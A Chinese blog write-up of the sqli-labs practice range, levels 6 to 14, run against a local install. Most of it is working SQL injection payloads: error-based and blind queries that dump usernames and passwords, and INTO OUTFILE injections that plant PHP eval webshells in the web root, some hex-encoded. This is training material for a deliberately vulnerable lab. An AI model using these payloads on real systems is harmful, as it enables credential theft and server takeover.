---
title: 【靶场】sql-labs-Less 6-14
date: 2025-08-30
categories:
  - 靶场
image: images/22.webp
---
# Less-6
**验证注入点：双引号报错，两个双引号闭合利用闭合方式：`" <payload> --+`**
就闭合方式和 Less-5 不一样外，其余都一样
1.进入第六题，显示`Please input the ID as parameter with numeric value`，告诉了我们参数为**id**
![Pasted image 20250313192901](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313192901.png)
发现闭合方式为"，和上一关同理采用报错注入，这里用extractvalue函数
```
http://localhost/sqli-labs/Less-6/?id=1"
```
![Pasted image 20250314110439](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314110439.png)
```php
?id=1" and extractvalue(1,concat(0x7e,(select concat(username,':',password) from users limit 0,1)))--+
```
![Pasted image 20250314110536](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314110536.png)
# Less-7
**验证注入点：单引号报错，两个单引号闭合利用闭合方式：`')) <payload> --+`**
```php
http://localhost/sqli-labs/Less-7/?id=1
```
![Pasted image 20250314110703](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314110703.png)
前置知识:
文件读写注入条件：
在配置文件中设置
**secure_file_priv=''** 
```
注：
1. Windows的配置文件在mysql下的my.ini
2. Linux的配置文件在/etc/conf
```
查看是否配置成功：
```php
show global variables like '%secure%';
```
![Pasted image 20250314113015](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314113015.png)
php的配置文件php.ini关闭魔术引号
1. **magic_quotes_gpc = Off**
2. **知道服务器的绝对路径**
3. **登录的账户具有root权限**
读取文件：
**load_file()**
```
例：select load_file("D:/password.txt") # 读取D盘下的password.txt文件
```
写文件：
**into outfile 路径**
实战
1.判断闭合方式闭合方式
利用报错信息判断闭合方式为'))
```php
http://localhost/sqli-labs/Less-7/?id=1 ')) --+
```
![Pasted image 20250314111716](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314111716.png)
利用文件读写注入写入木马：
写入一句话木马：
```php
正常Payload:<?php eval($_POST['pwd']);?>
十六进制：0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e

http://localhost/sqli-labs/Less-7/?id=-1')) UNION SELECT 1,2,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e into outfile 'C:\\phpstudy_pro\\WWW\\hack.php' --+
```
连接地址：http://localhost/hack.php
连接密码：pwd
![Pasted image 20250314132112](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314132112.png)
# Less-8
'闭合 布尔盲注
使用的注入语句和第五关的布尔盲注一样
示例，判断长度：
```
http://localhost/sqli-labs/Less-8/?id=1'and length((select database()))>7 --+
```
![Pasted image 20250317132316](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317132316.png)
写shell：
```
http://localhost/sqli-labs/Less-8/?id=-1' UNION SELECT 1,2,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e into outfile 'C:\\phpstudy_pro\\WWW\\hack.php' --+
```
![Pasted image 20250317132457](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317132457.png)
链接成功。
![Pasted image 20250317132622](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317132622.png)
# Less-9
基于GET单引号基于时间盲注
如果当前数据库名字符长度大于1，则执行sleep函数使数据库执行延迟，否则则返回1。
```
http://localhost/sqli-labs/Less-9/?id=1' and if(length(database())>1,sleep(5),1) --+
延迟5秒
```
![Pasted image 20250317140308](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317140308.png)
# Less-10
基于GET双引号基于时间盲注
与第9关差不多，只不过闭合方式变成双引号了
```
http://localhost/sqli-labs/Less-10/?id=1" and if(length(database())>1,sleep(5),1) --+
延迟5秒
```
![Pasted image 20250317140607](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317140607.png)
# Less-11
基于单引号的POST注入
**单引号测试：**
```php
uname=admin' and 1=1 --+ &passwd=&submit=Submit
```

![Pasted image 20250317144342](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317144342.png)
**字段个数：**
```php
uname=admin' order by 3 %23 &passwd=&submit=Submit  //报错
uname=admin' order by 2 %23 &passwd=&submit=Submit  //正常
说明有两个字段
```
![Pasted image 20250317144707](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317144707.png)
**查找回显位：**
```php
uname=-admin' union select 1,2 %23 &passwd=&submit=Submit
```
![Pasted image 20250317145213](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145213.png)
**爆库名：**
```php
uname=-admin' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 &passwd=&submit=Submit
```
![Pasted image 20250317145013](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145013.png)
**爆表名：**
```php
uname=-admin' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 &passwd=&submit=Submit
```
![Pasted image 20250317145312](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145312.png)
**爆列名：**
```php
uname=-admin' union select 1,group_concat(column_name) from information_schema.columns where table_name='emails' %23 &passwd=&submit=Submit
```
![Pasted image 20250317145416](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145416.png)
**爆信息：**
```php
uname=-admin' union select 1,group_concat(concat_ws('-',id,email_id)) from emails %23 &passwd=&submit=Submit
```
![Pasted image 20250317145535](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145535.png)
**写shell：**
```php
uname=-admin' UNION SELECT 1,'<?php @eval($_POST["v"]);?>' into outfile "D:\\phpStudy_pro\\WWW\\hack1.php" %23 &passwd=&submit=Submit
```
![Pasted image 20250317145849](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145849.png)
**成功连接**
![Pasted image 20250317145917](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145917.png)
# Less-12
跟11关差不多，但是使用的是**双引号加括号**进行闭合。
```
uname=admin") order by 2 --+&passwd=&submit=Submit
```
![Pasted image 20250317151040](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317151040.png)
然后后面跟11关一样。
# Less-13
基于**单引号加括号**进行闭合，错误回显注入。和十二关一样。
构建payload:
```php
uname=admin'&passwd=pass&submit=Submit
```
![Pasted image 20250324141135](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141135.png)
```
从返回结果（sql语法问题）可见本关的闭合是')
```
使用
```php
uname=admin') order by 2 --+&passwd=pass&submit=Submit
uname=admin') order by 3 --+&passwd=pass&submit=Submit
进行测试，发现可知查询结果有两列
```
![Pasted image 20250324141332](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141332.png)
![Pasted image 20250324141349](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141349.png)
使用union进行查询，发现没有回显。
```php
uname=admin') union select 1,2 --+&passwd=pass&submit=Submit
```
![Pasted image 20250324141550](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141550.png)
看来这关要用报错注入了
```php
#获取服务器上所有数据库的名称
uname=ele') and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#&passwd=pass&submit=Submit
uname=ele') and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,31),0x7e),1)#&passwd=pass&submit=Submit
uname=ele') and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),63,31),0x7e),1)#&passwd=pass&submit=Submit
#获取pikachu数据库的所有表名称
uname=ele') and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='pikachu'),1,31),0x7e),1)#&passwd=pass&submit=Submit
uname=ele') and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='pikachu'),32,31),0x7e),1)#&passwd=pass&submit=Submit
#获取pikachu数据库users表的所有列名称
uname=ele') and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'),1,31),0x7e),1)#&passwd=pass&submit=Submit
#获取pikachu数据库users表的username和password列的所有值
uname=ele') and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from pikachu.users),1,31),0x7e),1)#&passwd=pass&submit=Submit
uname=ele') and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from pikachu.users),32,31),0x7e),1)#&passwd=pass&submit=Submit
uname=ele') and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from pikachu.users),63,31),0x7e),1)#&passwd=pass&submit=Submit
uname=ele') and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from pikachu.users),94,31),0x7e),1)#&passwd=pass&submit=Submit
```
写webshell的payload:
```
uname=ele') or 1=1 limit 0,1 into outfile 'C:/less13.php' lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c65737331335d293b3f3e#&passwd=pass&submit=Submit
```
![Pasted image 20250324141817](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324141817.png)
# Less-14
这关回显sql语法错误，并且闭合是"
测试
```
uname=admin"&passwd=pass&submit=Submit
```
![Pasted image 20250324142325](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250324142325.png)
和上一关一样，这关如果sql查询有值也不显示，所以还是用报错注入，图就不截了，和上一关差不多，跨库爆数据的所有payload如下：
```php
#获取服务器上所有数据库的名称
uname=ele" and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#&passwd=pass&submit=Submit
uname=ele" and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,31),0x7e),1)#&passwd=pass&submit=Submit
uname=ele" and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),63,31),0x7e),1)#&passwd=pass&submit=Submit
#获取pikachu数据库的所有表名称
uname=ele" and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='pikachu'),1,31),0x7e),1)#&passwd=pass&submit=Submit
uname=ele" and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='pikachu'),32,31),0x7e),1)#&passwd=pass&submit=Submit
#获取pikachu数据库users表的所有列名称
uname=ele" and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users'),1,31),0x7e),1)#&passwd=pass&submit=Submit
#获取pikachu数据库users表的username和password列的所有值
uname=ele" and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from pikachu.users),1,31),0x7e),1)#&passwd=pass&submit=Submit
uname=ele" and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from pikachu.users),32,31),0x7e),1)#&passwd=pass&submit=Submit
uname=ele" and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from pikachu.users),63,31),0x7e),1)#&passwd=pass&submit=Submit
uname=ele" and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from pikachu.users),94,31),0x7e),1)#&passwd=pass&submit=Submit
```
写webshell的payload：
```php
uname=ele" or 1=1 limit 0,1 into outfile 'C:/less14.php' lines terminated by 0x3C3F7068702061737365727428245F504F53545B6C65737331345D293B3F3E#&passwd=pass&submit=Submit
```
本关代码与上一关的区别也仅在于闭合不同了。